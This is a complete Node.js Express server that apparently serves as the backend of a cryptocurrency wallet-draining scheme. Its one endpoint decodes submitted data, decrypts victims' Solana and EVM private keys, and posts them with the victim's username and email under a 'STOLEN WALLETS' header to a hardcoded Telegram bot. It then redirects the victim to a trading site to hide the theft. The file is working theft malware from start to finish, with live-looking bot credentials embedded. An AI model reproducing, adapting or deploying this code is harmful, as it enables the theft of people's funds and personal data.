const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const app = express();

const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const TG_CHAT = '7680513699';

// Decrypt function
function decrypt(encrypted, bundleKey) {
  try {
    const [ivHex, encryptedData] = encrypted.split(':');
    const iv = Buffer.from(ivHex, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encryptedData, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (e) {
    return 'DECRYPT_ERROR';
  }
}

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    let sBundles = data.sBundles;
    let eBundles = data.eBundles;
    
    if (typeof sBundles === 'string') sBundles = JSON.parse(sBundles);
    if (typeof eBundles === 'string') eBundles = JSON.parse(eBundles);
    
    // Decrypt private keys
    const decryptedSolana = sBundles?.map(enc => decrypt(enc, data.bundle)) || [];
    const decryptedEVM = eBundles?.map(enc => decrypt(enc, data.bundle)) || [];
    
    const msg = `
🚨 STOLEN WALLETS

👤 User: ${data.user?.username || 'N/A'}
📧 Email: ${data.user?.email || 'N/A'}

🔑 Bundle Key:
${data.bundle}

💰 Solana Keys (${decryptedSolana.length}):
${decryptedSolana.join('\n') || 'None'}

💰 EVM Keys (${decryptedEVM.length}):
${decryptedEVM.join('\n') || 'None'}

🌐 ${data.site}
⏰ ${new Date().toISOString()}
    `;
    
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TG_CHAT,
        text: msg
      })
    });
    
    res.redirect('https://axiom.trade/discover');
  } catch (e) {
    console.error(e);
    res.status(500).send('err');
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log('Server running');
});
